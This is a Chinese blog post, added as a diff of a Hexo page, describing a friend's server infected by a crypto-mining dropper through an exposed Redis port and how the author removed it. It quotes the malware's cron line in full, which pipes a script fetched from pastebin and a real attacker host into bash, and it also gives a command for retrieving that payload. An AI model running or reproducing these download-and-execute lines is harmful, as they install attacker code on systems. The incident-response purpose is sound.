@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>记一次老友的Linux服务器被恶意程序入侵并解决的过程 | 集合</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+  <meta name="description" content="首先放一个老友的连接：http:&#x2F;&#x2F;yuyy.info 恶意程序名称：javaUpdate 可能是这个 最近的日子正是毕业的日子，也是最忙的日子。老友给我发了条信息 我去，怎么就中招了呢 通过ssh登录老友的服务器，发现登录的时候要卡很久，通过强制中断ctrl+c才能看见用户提示符 用top命令查看下现阶段运行进程情况，top命令简单说就是监控Linux中运行的进程的在系统中情况 好家伙 通常的这">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次老友的Linux服务器被恶意程序入侵并解决的过程">
+<meta property="og:url" content="http://mimonarchrd.gitee.io/midou/passages/e8-ae-b0-e4-b8-80-e6-ac-a1-e8-80-81-e5-8f-8b-e7-9a-84linux-e6-9c-8d-e5-8a-a1-e5-99-a8-e8-a2-ab-e6-81-b6-e6-84-8f-e7-a8-8b-e5-ba-8f-e5-85-a5-e4-be-b5-e5-b9-b6-e8-a7-a3-e5-86-b3-e7-9a-84-e8-bf-87/index.html">
+<meta property="og:site_name" content="集合">
+<meta property="og:description" content="首先放一个老友的连接：http:&#x2F;&#x2F;yuyy.info 恶意程序名称：javaUpdate 可能是这个 最近的日子正是毕业的日子，也是最忙的日子。老友给我发了条信息 我去，怎么就中招了呢 通过ssh登录老友的服务器，发现登录的时候要卡很久，通过强制中断ctrl+c才能看见用户提示符 用top命令查看下现阶段运行进程情况，top命令简单说就是监控Linux中运行的进程的在系统中情况 好家伙 通常的这">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-06-14T05:52:46.000Z">
+<meta property="article:modified_time" content="2021-08-18T02:36:30.549Z">
+<meta property="article:author" content="米豆">
+<meta property="article:tag" content="恶意入侵Linux服务器">
+<meta property="article:tag" content="挖矿">
+<meta property="article:tag" content="运维安全">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/midou/atom.xml" title="集合" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/midou/css/favicon.ico">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/midou/css/style.css">
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <a target="_blank" rel="noopener" href="https://www.pixiv.net/artworks/90437941"><div id="banner"></div></a>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/midou/" id="logo">集合</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/midou/">Home</a>
+        
+          <a class="main-nav-link" href="/midou/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/midou/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://mimonarchrd.gitee.io/midou"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-e8-ae-b0-e4-b8-80-e6-ac-a1-e8-80-81-e5-8f-8b-e7-9a-84linux-e6-9c-8d-e5-8a-a1-e5-99-a8-e8-a2-ab-e6-81-b6-e6-84-8f-e7-a8-8b-e5-ba-8f-e5-85-a5-e4-be-b5-e5-b9-b6-e8-a7-a3-e5-86-b3-e7-9a-84-e8-bf-87" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/midou/passages/e8-ae-b0-e4-b8-80-e6-ac-a1-e8-80-81-e5-8f-8b-e7-9a-84linux-e6-9c-8d-e5-8a-a1-e5-99-a8-e8-a2-ab-e6-81-b6-e6-84-8f-e7-a8-8b-e5-ba-8f-e5-85-a5-e4-be-b5-e5-b9-b6-e8-a7-a3-e5-86-b3-e7-9a-84-e8-bf-87/" class="article-date">
+  <time datetime="2020-06-14T05:52:46.000Z" itemprop="datePublished">2020-06-14</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/midou/categories/%E5%AD%A6%E4%B9%A0%E5%91%A6/">学习呦</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      记一次老友的Linux服务器被恶意程序入侵并解决的过程
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>首先放一个老友的连接：<a target="_blank" rel="noopener" href="http://yuyy.info/">http://yuyy.info</a></p>
+<p>恶意程序名称：javaUpdate</p>
+<p>可能是这个</p>
+<p>最近的日子正是毕业的日子，也是最忙的日子。老友给我发了条信息</p>
+<p>我去，怎么就中招了呢</p>
+<p>通过ssh登录老友的服务器，<strong>发现登录的时候要卡很久，通过强制中断ctrl+c才能看见用户提示符</strong></p>
+<p>用top命令查看下现阶段运行进程情况，top命令简单说就是监控Linux中运行的进程的在系统中情况</p>
+<p>好家伙</p>
+<p>通常的这些恶意进程是无法直接通过kill杀死的，有保护进程或者说有定时任务会重启什么的。</p>
+<p>既然看见了这个进程，就进入/proc/$proc_num(进程号)/中cat里面的exe文件，这个文件夹是内存中运行的进程的地方，找到这个图中的“1056”号文件夹，cat这个exe，这个文件直接指向可执行程序。</p>
+<p>这里没有截图，不过执行cat后的结果是提示这个可执行文件已经删除了</p>
+<p>所以这个恶意程序，通过了服务器中的某一个开放的端口扫描到了靶机，之后通过扫描漏洞进行渗透，这一次的入侵老友说是通过redis的开放端口，老友为了方便，直接开放了6789端口，并且将本仅能本地访问的redis的IP改成了4个0。</p>
+<p>为了不让你抓到这个程序，他在执行完后就自我删除了。你通过ps -ef命令是找不到脚本的位置的</p>
+<p>执行的内容会放一个脚本，也会简单说明执行了什么命令在服务器上，也会说明如何得到的这个脚本。</p>
+<p>好吧，现在就一步步来解决问题吧</p>
+<p>首先进行的一些常规的操作</p>
+<p>最基本的操作，改root用户密码，停止redis服务。我是将我好友上面的apache，mysql，nginx等服务都停止了。防止恶意程序会再扫描服务器漏洞进行入侵。</p>
+<p>下一步操作，进入阿里云的实例控制台中的防火墙，或者安全策略</p>
+<p>禁用一些不需要的端口</p>
+<p>切记不要图方便开启xxxx-xxxx号端口的危险行为</p>
+<p>之后，我前面已经提到了，关闭一些服务</p>
+<p>找到这个脚本</p>
+<p>既然上文已经提到是先下载，再执行，后删除。那么怎么定位这个脚本呢？因为如果你通过kill来处理掉这个进程，过一会儿就又会启动。这说明要么就是守护进程，要么就是在定时任务中。通常如果是一个守护进程，恶意程序是不会让你使用类似top或者ps命令查看到此类进程。</p>
+<p>进程隐藏的方式的恶意程序要比这次对付的程序强大的多，这个先不提及</p>
+<p>因为直接cat定时任务crontab很快速就先看了</p>
+<p>来看看服务器中可怜的定时任务</p>
+<p>并且，在bin目录下，也生成了两个可执行的sh</p>
+<p>可以见到还上锁了</p>
+<p>内容如下：</p>
+<p>可见会从不同的url下载恶意程序</p>
+<p>这里说明下，如果要解锁一个文件，要用下面的命令</p>
+<pre><code>chattr -i xxx
+</code></pre>
+<p>同时有一个定时文件是定时执行这两个文件</p>
+<p><strong>这里要注意一点，因为有些恶意程序会劫持命令，比如rm命令会给你换名字，或者不会让你执行</strong></p>
+<p>如果有这种情况，可以使用busybox，busybox相当于一个集成命令的工具，里面有一些常用的命令，使用busybox的时候只要加上这个工具名字的前缀就可</p>
+<pre><code>busybox rm xxx
+</code></pre>
+<p>cat出定时任务，可以看到下面的内容</p>
+<p>有点小</p>
+<pre><code>sed -i &#39;/aziplcr72qjhzvin/d&#39; /etc/hosts; (python -c &#39;import urllib2 as fbi;print fbi.urlopen(&quot;https://pastebin.com/raw/1eDKHr4r&quot;).read()&#39;||curl -fsSLk sadan666.xyz:9080/rr||wget -q -O - sadan666.xyz:9080/rr --no-check-certificate -t 2 -T 60)|bash
+</code></pre>
+<p>第一部分：</p>
+<pre><code>sed -i &#39;/aziplcr72qjhzvin/d&#39; /etc/hosts;
+</code></pre>
+<p>。。</p>
+<p>往hosts文件中写东西，是加密的。主要就是将0.0.0.0解析到一个网址</p>
+<p>第二部分：</p>
+<pre><code>python -c &#39;import urllib2 as fbi;print fbi.urlopen(&quot;https://pastebin.com/raw/1eDKHr4r&quot;).read()&#39;
+</code></pre>
+<p>使用urllib2库来执行一条python语句，打开后面那个网址</p>
+<p>第三部分：</p>
+<pre><code>curl -fsSLk sadan666.xyz:9080/rr||wget -q -O - sadan666.xyz:9080/rr --no-check-certificate -t 2 -T 60)|bash
+</code></pre>
+<p>都是从后面那个url中curl和wget一段经过base64加密的脚本之后执行，注意里面的选项都是启用了静默模式的，不会有任何输出，所以我们无法通过日志等文件查看这两条命令的执行记录</p>
+<p>所以，有了这个，找到脚本不难，但不是说在服务器上找，而是我们直接请求他的url获得脚本</p>
+<pre><code>(curl -fsSL https://pastebin.com/raw/UhUmR517||wget -q -O - https://pastebin.com/raw/UhUmR517)|sed &#39;s/\r//&#39;
+</code></pre>
+<p>这里的url和上面的不同，这里的url是从其他定时任务文件中得到的，上面有截图显示这个url，但是他们指向的都是一个恶意脚本</p>
+<p>将得到的bash64结果放到在线的解码器中</p>
+<p>这就找到这个脚本了</p>
+<p>这里我将脚本放到这里供大家参考</p>
+<p>PS.wp不支持sh文件上传，就上传txt了，我已经将里面的一些部分更改，以防意外</p>
+<p><a target="_blank" rel="noopener" href="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/wakuang.zip">wakuang</a><a target="_blank" rel="noopener" href="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/wakuang.zip">下载</a></p>
+<p>通过这个文件的分析，能得到所有的cron定时任务文件都被写入了上面的命令，会在每时每刻都会执行上面的命令，获取到这个可执行的脚本，之后执行这个脚本删除它，脚本中再往定时任务，root的.bashrc文件中写入上述的命令。如果我们只是单纯的kill到那个恶意进程，定时任务会立刻执行重新下载脚本并执行，如果我们将定时任务中的任务删除，当我们每次通过ssh登录服务器时，会执行.bashrc文件，又开始了死循环</p>
+<p><strong>删除它</strong></p>
+<p>好的，我们已经简单的分析下，那么我们改怎么处理呢？难道说通过拼手速的方式？</p>
+<p>很简单的方法，如果恶意程序要用到curl和wget命令来下载恶意程序，那就。。</p>
+<p><strong>第一步</strong>：删除wget命令和curl命令，或者将bin目录下面的两者移出去，这样先阻断了通过网络再次下载进程</p>
+<p><strong>第二步</strong>：删除所有的定时任务前，把crond定时任务的服务关了，并且，直接删了定时任务执行的命令。这样，写在定时任务中的命令就失效了</p>
+<p><strong>第三步</strong>：kill掉恶意程序进程，现在kill掉。定时任务失效，wget和curl都用不了，无法从网上下载恶意程序</p>
+<p><strong>第四步</strong>：清理定时任务文件，并且要清理.bashrc下面写入的下载恶意脚本命令，要不然下次连接服务器就又会执行下载命令</p>
+<p><strong>第五步</strong>：查看有没有可疑进程等</p>
+<p>我这边直接top了下，服务器恢复了正常</p>
+<p><strong>总结</strong></p>
+<p>基本来说，这是一次正式挖矿前的清理服务器其他挖矿程序和注入自己恶意程序的操作。并不是正真的挖矿程序</p>
+<p>恶意程序其中的一部分</p>
+<p>上图可以见到这个恶意脚本会kill一些其他的挖矿脚本，之后就是上述提到的步骤。我通过分析这个脚本并没有找到挖矿程序。通过top分析也没有进程占用异常的资源的情况，所以，我仅觉得是挖矿前的“清理”，同行的恶意竞争？？笑~</p>
+
+      
+    </div>
+    
+    <footer class="article-footer">
+      <a data-url="http://mimonarchrd.gitee.io/midou/passages/e8-ae-b0-e4-b8-80-e6-ac-a1-e8-80-81-e5-8f-8b-e7-9a-84linux-e6-9c-8d-e5-8a-a1-e5-99-a8-e8-a2-ab-e6-81-b6-e6-84-8f-e7-a8-8b-e5-ba-8f-e5-85-a5-e4-be-b5-e5-b9-b6-e8-a7-a3-e5-86-b3-e7-9a-84-e8-bf-87/" data-id="cksi8nt89001gi8q019fycemv" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/midou/tags/%E6%81%B6%E6%84%8F%E5%85%A5%E4%BE%B5Linux%E6%9C%8D%E5%8A%A1%E5%99%A8/" rel="tag">恶意入侵Linux服务器</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/midou/tags/%E6%8C%96%E7%9F%BF/" rel="tag">挖矿</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/midou/tags/%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8/" rel="tag">运维安全</a></li></ul>
+
+    </footer>
+  </div>
+  <br />
+  <div id="vcomments"></div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/midou/passages/linux-e4-b8-ad-e7-9a-84-e5-92-8c/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Linux中的||和&amp;&amp;
+        
+      </div>
+    </a>
+  
+  
+    <a href="/midou/passages/e5-a4-a7-e5-a4-b4-e8-8f-9c-e4-bb-b7-e6-a0-bc-e5-ae-8c-e5-85-a8-e6-94-bb-e7-95-a5/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">大头菜价格完全攻略</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/midou/categories/Uncategorized/">Uncategorized</a></li><li class="category-list-item"><a class="category-list-link" href="/midou/categories/%E5%AD%A6%E4%B9%A0%E5%91%A6/">学习呦</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/midou/categories/%E5%AD%A6%E4%B9%A0%E5%91%A6/%E6%B8%B8%E6%88%8F%E5%93%8E/">游戏哎</a></li><li class="category-list-item"><a class="category-list-link" href="/midou/categories/%E5%AD%A6%E4%B9%A0%E5%91%A6/%E7%94%9F%E6%B4%BB/">生活</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/midou/categories/%E6%B8%B8%E6%88%8F%E5%93%8E/">游戏哎</a></li><li class="category-list-item"><a class="category-list-link" href="/midou/categories/%E7%94%9F%E6%B4%BB/">生活</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/midou/tags/AI/" rel="tag">AI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/midou/tags/AIO/" rel="tag">AIO</a></li><li class="tag-list-item"><a class="tag-list-link" href="/midou/tags/Animal-Crossing/" rel="tag">Animal Crossing</a></li><li class="tag-list-item"><a class="tag-list-link" href="/midou/tags/CDN%E5%8A%A0%E9%80%9F/" rel="tag">CDN加速</a></li><li class="tag-list-item"><a class="tag-list-link" href="/midou/tags/HTTPS/" rel="tag">HTTPS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/midou/tags/Linux/" rel="tag">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/midou/tags/Linux%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4/" rel="tag">Linux中的命令</a></li><li class="tag-list-item"><a class="tag-list-link" href="/midou/tags/NAS/" rel="tag">NAS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/midou/tags/OVM/" rel="tag">OVM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/midou/tags/addon/" rel="tag">addon</a></li><li class="tag-list-item"><a class="tag-list-link" href="/midou/tags/minecraft/" rel="tag">minecraft</a></li><li class="tag-list-item"><a class="tag-list-link" href="/midou/tags/ray-tarcing/" rel="tag">ray tarcing</a></li><li class="tag-list-item"><a class="tag-list-link" href="/midou/tags/shell/" rel="tag">shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/midou/tags/webpack/" rel="tag">webpack</a></li><li class="tag-list-item"><a class="tag-list-link" href="/midou/tags/wordpress/" rel="tag">wordpress</a></li><li class="tag-list-item"><a class="tag-list-link" href="/midou/tags/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/" rel="tag">个人博客</a></li><li class="tag-list-item"><a class="tag-list-link" href="/midou/tags/%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA/" rel="tag">光线追踪</a></li><li class="tag-list-item"><a class="tag-list-link" href="/midou/tags/%E5%85%89%E8%BF%BD/" rel="tag">光追</a></li><li class="tag-list-item"><a class="tag-list-link" href="/midou/tags/%E5%85%AB%E6%96%B9%E6%97%85%E4%BA%BA/" rel="tag">八方旅人</a></li><li class="tag-list-item"><a class="tag-list-link" href="/midou/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" rel="tag">内网穿透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/midou/tags/%E5%8A%A8%E6%A3%AE/" rel="tag">动森</a></li><li class="tag-list-item"><a class="tag-list-link" href="/midou/tags/%E5%8A%A8%E7%89%A9%E6%A3%AE%E5%8F%8B%E4%BC%9A/" rel="tag">动物森友会</a></li><li class="tag-list-item"><a class="tag-list-link" href="/midou/tags/%E5%8A%A8%E9%9D%99%E5%88%86%E7%A6%BB/" rel="tag">动静分离</a></li><li class="tag-list-item"><a class="tag-list-link" href="/midou/tags/%E5%8D%9A%E5%AE%A2/" rel="tag">博客</a></li><li class="tag-list-item"><a class="tag-list-link" href="/midou/tags/%E5%A4%A7%E7%99%BD%E8%8F%9C%E6%94%BB%E7%95%A5%E6%9C%80%E8%AF%A6%E7%BB%86/" rel="tag">大白菜攻略最详细</a></li><li class="tag-list-item"><a class="tag-list-link" href="/midou/tags/%E5%AD%A6%E4%B9%A0/" rel="tag">学习</a></li><li class="tag-list-item"><a class="tag-list-link" href="/midou/tags/%E5%B5%8C%E5%85%A5%E5%BC%8F/" rel="tag">嵌入式</a></li><li class="tag-list-item"><a class="tag-list-link" href="/midou/tags/%E5%BB%BA%E7%AB%99/" rel="tag">建站</a></li><li class="tag-list-item"><a class="tag-list-link" href="/midou/tags/%E5%BC%80%E5%8F%91/" rel="tag">开发</a></li><li class="tag-list-item"><a class="tag-list-link" href="/midou/tags/%E6%81%B6%E6%84%8F%E5%85%A5%E4%BE%B5Linux%E6%9C%8D%E5%8A%A1%E5%99%A8/" rel="tag">恶意入侵Linux服务器</a></li><li class="tag-list-item"><a class="tag-list-link" href="/midou/tags/%E6%88%91/" rel="tag">我</a></li><li class="tag-list-item"><a class="tag-list-link" href="/midou/tags/%E6%88%91%E7%9A%84%E4%B8%96%E7%95%8C/" rel="tag">我的世界</a></li><li class="tag-list-item"><a class="tag-list-link" href="/midou/tags/%E6%8C%96%E7%9F%BF/" rel="tag">挖矿</a></li><li class="tag-list-item"><a class="tag-list-link" href="/midou/tags/%E6%9C%89%E8%B6%A3/" rel="tag">有趣</a></li><li class="tag-list-item"><a class="tag-list-link" href="/midou/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/" rel="tag">树莓派</a></li><li class="tag-list-item"><a class="tag-list-link" href="/midou/tags/%E6%AD%A7%E9%80%94%E6%97%85%E4%BA%BA/" rel="tag">歧途旅人</a></li><li class="tag-list-item"><a class="tag-list-link" href="/midou/tags/%E6%B8%B8%E6%88%8F/" rel="tag">游戏</a></li><li class="tag-list-item"><a class="tag-list-link" href="/midou/tags/%E7%94%9F%E6%B4%BB/" rel="tag">生活</a></li><li class="tag-list-item"><a class="tag-list-link" href="/midou/tags/%E7%BD%91%E7%BB%9C%E9%99%84%E5%B1%9E%E5%AD%98%E5%82%A8/" rel="tag">网络附属存储</a></li><li class="tag-list-item"><a class="tag-list-link" href="/midou/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/" rel="tag">自动化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/midou/tags/%E8%A1%8C%E4%B8%BA%E5%8C%85/" rel="tag">行为包</a></li><li class="tag-list-item"><a class="tag-list-link" href="/midou/tags/%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8/" rel="tag">运维安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/midou/tags/%E8%BF%9B%E9%98%B6%E7%AF%87/" rel="tag">进阶篇</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/midou/tags/AI/" style="font-size: 20px;">AI</a> <a href="/midou/tags/AIO/" style="font-size: 10px;">AIO</a> <a href="/midou/tags/Animal-Crossing/" style="font-size: 10px;">Animal Crossing</a> <a href="/midou/tags/CDN%E5%8A%A0%E9%80%9F/" style="font-size: 10px;">CDN加速</a> <a href="/midou/tags/HTTPS/" style="font-size: 10px;">HTTPS</a> <a href="/midou/tags/Linux/" style="font-size: 15px;">Linux</a> <a href="/midou/tags/Linux%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4/" style="font-size: 10px;">Linux中的命令</a> <a href="/midou/tags/NAS/" style="font-size: 15px;">NAS</a> <a href="/midou/tags/OVM/" style="font-size: 10px;">OVM</a> <a href="/midou/tags/addon/" style="font-size: 10px;">addon</a> <a href="/midou/tags/minecraft/" style="font-size: 10px;">minecraft</a> <a href="/midou/tags/ray-tarcing/" style="font-size: 10px;">ray tarcing</a> <a href="/midou/tags/shell/" style="font-size: 10px;">shell</a> <a href="/midou/tags/webpack/" style="font-size: 10px;">webpack</a> <a href="/midou/tags/wordpress/" style="font-size: 10px;">wordpress</a> <a href="/midou/tags/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/" style="font-size: 10px;">个人博客</a> <a href="/midou/tags/%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA/" style="font-size: 10px;">光线追踪</a> <a href="/midou/tags/%E5%85%89%E8%BF%BD/" style="font-size: 10px;">光追</a> <a href="/midou/tags/%E5%85%AB%E6%96%B9%E6%97%85%E4%BA%BA/" style="font-size: 10px;">八方旅人</a> <a href="/midou/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" style="font-size: 10px;">内网穿透</a> <a href="/midou/tags/%E5%8A%A8%E6%A3%AE/" style="font-size: 15px;">动森</a> <a href="/midou/tags/%E5%8A%A8%E7%89%A9%E6%A3%AE%E5%8F%8B%E4%BC%9A/" style="font-size: 15px;">动物森友会</a> <a href="/midou/tags/%E5%8A%A8%E9%9D%99%E5%88%86%E7%A6%BB/" style="font-size: 10px;">动静分离</a> <a href="/midou/tags/%E5%8D%9A%E5%AE%A2/" style="font-size: 10px;">博客</a> <a href="/midou/tags/%E5%A4%A7%E7%99%BD%E8%8F%9C%E6%94%BB%E7%95%A5%E6%9C%80%E8%AF%A6%E7%BB%86/" style="font-size: 10px;">大白菜攻略最详细</a> <a href="/midou/tags/%E5%AD%A6%E4%B9%A0/" style="font-size: 15px;">学习</a> <a href="/midou/tags/%E5%B5%8C%E5%85%A5%E5%BC%8F/" style="font-size: 15px;">嵌入式</a> <a href="/midou/tags/%E5%BB%BA%E7%AB%99/" style="font-size: 10px;">建站</a> <a href="/midou/tags/%E5%BC%80%E5%8F%91/" style="font-size: 10px;">开发</a> <a href="/midou/tags/%E6%81%B6%E6%84%8F%E5%85%A5%E4%BE%B5Linux%E6%9C%8D%E5%8A%A1%E5%99%A8/" style="font-size: 10px;">恶意入侵Linux服务器</a> <a href="/midou/tags/%E6%88%91/" style="font-size: 10px;">我</a> <a href="/midou/tags/%E6%88%91%E7%9A%84%E4%B8%96%E7%95%8C/" style="font-size: 15px;">我的世界</a> <a href="/midou/tags/%E6%8C%96%E7%9F%BF/" style="font-size: 10px;">挖矿</a> <a href="/midou/tags/%E6%9C%89%E8%B6%A3/" style="font-size: 10px;">有趣</a> <a href="/midou/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/" style="font-size: 15px;">树莓派</a> <a href="/midou/tags/%E6%AD%A7%E9%80%94%E6%97%85%E4%BA%BA/" style="font-size: 10px;">歧途旅人</a> <a href="/midou/tags/%E6%B8%B8%E6%88%8F/" style="font-size: 10px;">游戏</a> <a href="/midou/tags/%E7%94%9F%E6%B4%BB/" style="font-size: 10px;">生活</a> <a href="/midou/tags/%E7%BD%91%E7%BB%9C%E9%99%84%E5%B1%9E%E5%AD%98%E5%82%A8/" style="font-size: 10px;">网络附属存储</a> <a href="/midou/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/" style="font-size: 10px;">自动化</a> <a href="/midou/tags/%E8%A1%8C%E4%B8%BA%E5%8C%85/" style="font-size: 10px;">行为包</a> <a href="/midou/tags/%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8/" style="font-size: 10px;">运维安全</a> <a href="/midou/tags/%E8%BF%9B%E9%98%B6%E7%AF%87/" style="font-size: 10px;">进阶篇</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/midou/archives/2021/07/">七月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/midou/archives/2020/06/">六月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/midou/archives/2020/05/">五月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/midou/archives/2020/04/">四月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/midou/archives/2020/02/">二月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/midou/archives/2020/01/">一月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/midou/archives/2019/11/">十一月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/midou/archives/2019/10/">十月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/midou/archives/2019/08/">八月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/midou/archives/2019/06/">六月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/midou/archives/2019/04/">四月 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/midou/passages/%E9%BB%91%E8%8B%B9%E6%9E%9Copencore2021%E5%92%8Cwin11%E5%81%9A%E6%9C%8B%E5%8F%8B/">黑苹果opencore2021和win11做朋友</a>
+          </li>
+        
+          <li>
+            <a href="/midou/passages/webpack%E7%AF%87/">webpack篇</a>
+          </li>
+        
+          <li>
+            <a href="/midou/passages/linux-e4-b8-ad-e7-9a-84-e5-92-8c/">Linux中的||和&amp;&amp;</a>
+          </li>
+        
+          <li>
+            <a href="/midou/passages/e8-ae-b0-e4-b8-80-e6-ac-a1-e8-80-81-e5-8f-8b-e7-9a-84linux-e6-9c-8d-e5-8a-a1-e5-99-a8-e8-a2-ab-e6-81-b6-e6-84-8f-e7-a8-8b-e5-ba-8f-e5-85-a5-e4-be-b5-e5-b9-b6-e8-a7-a3-e5-86-b3-e7-9a-84-e8-bf-87/">记一次老友的Linux服务器被恶意程序入侵并解决的过程</a>
+          </li>
+        
+          <li>
+            <a href="/midou/passages/e5-a4-a7-e5-a4-b4-e8-8f-9c-e4-bb-b7-e6-a0-bc-e5-ae-8c-e5-85-a8-e6-94-bb-e7-95-a5/">大头菜价格完全攻略</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2021 米豆<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/midou/" class="mobile-nav-link">Home</a>
+  
+    <a href="/midou/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/midou/fancybox/jquery.fancybox.css">
+
+  
+<script src="/midou/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/midou/js/script.js"></script>
+
+
+
+
+  </div>
+  <script>
+    new Valine({
+        el: '#vcomments',
+        appId: '16RIoAUdMwdJKhah8eqwpG8e-gzGzoHsz',
+        appKey: 'rjY2FM4qe5PGNokVnDjN7TVk'
+    })
+</script>
+<script src="/midou/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/midou/live2dw/assets/assets/hibiki.model.json"},"display":{"position":"right","width":200,"height":450},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
